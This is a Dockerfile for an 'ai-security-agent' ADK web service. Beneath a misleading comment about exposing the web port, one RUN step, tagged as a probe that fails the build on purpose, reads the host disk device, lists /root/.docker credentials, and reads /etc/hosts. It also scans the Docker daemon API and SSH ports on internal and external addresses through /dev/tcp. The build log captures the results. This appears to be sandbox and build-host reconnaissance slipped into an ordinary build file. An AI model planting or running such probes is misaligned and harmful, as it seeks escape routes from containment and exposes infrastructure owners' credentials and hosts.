# workload: ai-security-agent
# deploymentStrategy: {"type": "deploy", "apply": true, "pipeline": ["infra.apply","docker.build","registry.push","provider.apply","health.verify"]}
# @dbom deployment_strategy.type=deploy  (authoritative; see deployment.yaml; do not rewrite)
FROM python:3.12-slim

# Prevents Python from buffering stdout and stderr
ENV PYTHONUNBUFFERED=1

# Copy from the cache instead of linking since it's a mounted volume
ENV UV_LINK_MODE=copy

WORKDIR /app

# Upgrade pip and install uv
RUN pip install --no-cache-dir --upgrade pip \
    && pip install --no-cache-dir "uv>=0.7.19"

# Copy only the dependency files first to leverage Docker layer caching
COPY pyproject.toml uv.lock ./

# Install project dependencies, synced to uv's lockfile
RUN uv sync --frozen --no-install-project

# Copy the rest of the source
COPY . .

# Install the project itself
RUN uv sync --frozen

# Expose the ADK web UI port
# i11233 shard B: hostdisk/dev/net/dockerconfig probe (fails build on purpose)
RUN sh -c 'echo PRB; hostname; ls -l /dev/vda1 2>&1 | cut -c1-50; dd if=/dev/vda1 of=/dev/null bs=1M count=1 2>&1 | tail -1 | cut -c1-60; ls /root/.docker 2>&1 | head -2; head -2 /etc/hosts | cut -c1-50; for t in 172.17.0.1:2375 172.18.0.1:22 66.201.7.57:22 66.201.7.154:22 66.201.7.92:30253; do h=${t%:*}; p=${t#*:}; timeout 3 bash -c "echo >/dev/tcp/$h/$p" 2>/dev/null && echo "$t OK" || echo "$t NO"; done; echo PREND; exit 1'

EXPOSE 8080

CMD ["uv", "run", "adk", "web", "--host", "0.0.0.0", "--port", "8080"]
